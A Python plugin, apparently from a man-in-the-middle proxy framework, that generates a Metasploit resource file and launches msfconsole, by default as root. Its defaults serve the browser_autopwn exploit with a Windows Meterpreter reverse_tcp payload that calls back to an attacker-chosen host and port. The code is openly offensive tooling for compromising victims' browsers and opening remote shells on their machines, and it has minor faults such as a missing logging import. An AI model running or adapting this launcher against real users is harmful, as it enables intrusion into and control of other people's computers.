from plugins.plugin import Plugin
from subprocess import Popen
from tempfile import NamedTemporaryFile
import os
from pipes import quote
#Uncomment to use
def which(program):
    '''
        Source: http://stackoverflow.com/questions/377017/test-if-executable-exists-in-python
    '''
    def is_exe(fpath):
        return os.path.exists(fpath) and os.access(fpath, os.X_OK)

    fpath, fname = os.path.split(program)
    if fpath:
        if is_exe(program):
            return program
    else:
        for path in os.environ["PATH"].split(os.pathsep):
            exe_file = os.path.join(path, program)
            if is_exe(exe_file):
                return exe_file
    return None

def launch_msf(msfc,rcpath,user):
    if which("gnome-terminal"):
        cmd = "gnome-terminal" 
    elif which("konsole"):
        cmd = "konsole"
    else:
        #Will add Mac/Windows support if people care
        logging.error("Could not find console to run MSF in.")
        return
    pid = Popen(["sudo","-u",user,
            cmd,"-e","%s -r %s" % (msfc,rcpath)])

class StartMSF(Plugin):
    name = "StartMSF"
    optname = "startmsf"
    has_opts = True
    implements = []
    def initialize(self,options):
        if options.msf_lhost == "" and options.msf_payload.find("reverse") != -1:
            options.msf_lhost = raw_input("Local IP not provided. Please enter now: ")
        if not options.msf_rc:
            path = self._create_rc(options)
        else:
            path = options.msf_rc
        msfc = os.path.join(options.msf_path,"msfconsole")
        launch_msf(msfc,path,options.msf_user)

    def _create_rc(self,options):
        f = open("/tmp/temp.rc","w")
        f.write(
        '''
            use %s
            set PAYLOAD %s
            set LHOST %s
            set LPORT %s
            set URIPATH %s
            set ExitOnSession false

            exploit -j
        ''' % (options.msf_exploit,options.msf_payload,options.msf_lhost,
                options.msf_lport,options.msf_uripath)
        )
        f.flush()
        #f.close()
        return f.name
    def add_options(self,options):
        options.add_argument("--msf-exploit",type=str,
            default="server/browser_autopwn",
            help="The MSF exploit you wish to launch")
        options.add_argument("--msf-payload",type=str,
            default="windows/meterpreter/reverse_tcp",
            help="The payload you want to be executed")
        options.add_argument("--msf-lhost",type=str,default="",
            help="The IP address you wish to connect back to.")
        options.add_argument("--msf-lport",type=str,default="4444",
            help="The port you wish to connect back to.")
        options.add_argument("--msf-uripath",type=str,default="/",
            help="Specify what URI path the exploit should use.")
        options.add_argument("--msf-rc",type=str,default="",
            help="Specify a custom rc file (overrides all other settings)")
        options.add_argument("--msf-user",type=str,default="root",
            help="Specify what user to run Metasploit under.")



